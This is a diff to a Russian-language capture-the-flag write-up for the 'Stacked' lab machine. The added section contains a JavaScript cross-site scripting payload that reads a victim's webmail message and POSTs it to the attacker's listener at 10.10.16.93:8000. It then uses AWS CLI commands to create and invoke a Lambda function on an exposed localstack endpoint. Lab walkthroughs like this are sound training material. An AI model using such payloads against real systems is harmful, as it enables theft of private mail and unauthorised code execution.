@@ -151,3 +151,52 @@ secondReq.send(response);
 ```
 
 ![](../.gitbook/assets/9.png)
+
+В данном ответе я ничего интересного не нашел, поэтому немного изменил скрипт на самое первое сообщение и запустил по-новой:
+
+```javascript
+var url = "http://mail.stacked.htb/read-mail.php?id=1"
+
+var firstReq = new XMLHttpRequest();
+firstReq.open('GET', url, false);
+firstReq.send()
+
+var response = firstReq.responseText;
+
+var secondReq = new XMLHttpRequest();
+secondReq.open('POST', "http://10.10.16.93:8000/", false);
+secondReq.send(response);
+```
+
+И в новом сообщении есть вот такой текст:
+
+`<p>Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.</p>`
+
+Добавляем поддомен s3-testing.stacked.htb в /etc/hosts.
+
+![](../.gitbook/assets/10.png)
+
+Тут ничего нет, кроме строки {"status": "running"}. Как уже ранее было замечено, на сервере скорее всего используется AWS Labmda и localstack, поэтому можно попробовать создать lambda-функцию. Для этого конфигурируем aws консоль:
+
+![](../.gitbook/assets/11.png)
+
+Теперь с помощью [данной](https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html) инструкции составляем команду для отправки функции на сервер. Также нам понадобится javascript файл с простейшей функцией:
+
+```
+exports.handler =  async function(event, context) {
+  return "Hello"
+}
+```
+
+Теперь запаковываем файл в архив и отправляем:
+
+```
+$ zip index.zip index.js
+$ aws lambda --endpoint=http://s3-testing.stacked.htb create-function --function-name 'func' --role user --handler index.handler --runtime nodejs10.x --zip-file fileb://index.zip
+$ aws lambda --endpoint=http://s3-testing.stacked.htb invoke --function-name func out
+$ cat out
+```
+
+![](../.gitbook/assets/12.png)
+
+Вернулось сообщение - Hello, значит функция успешно объявлена и сохранена.
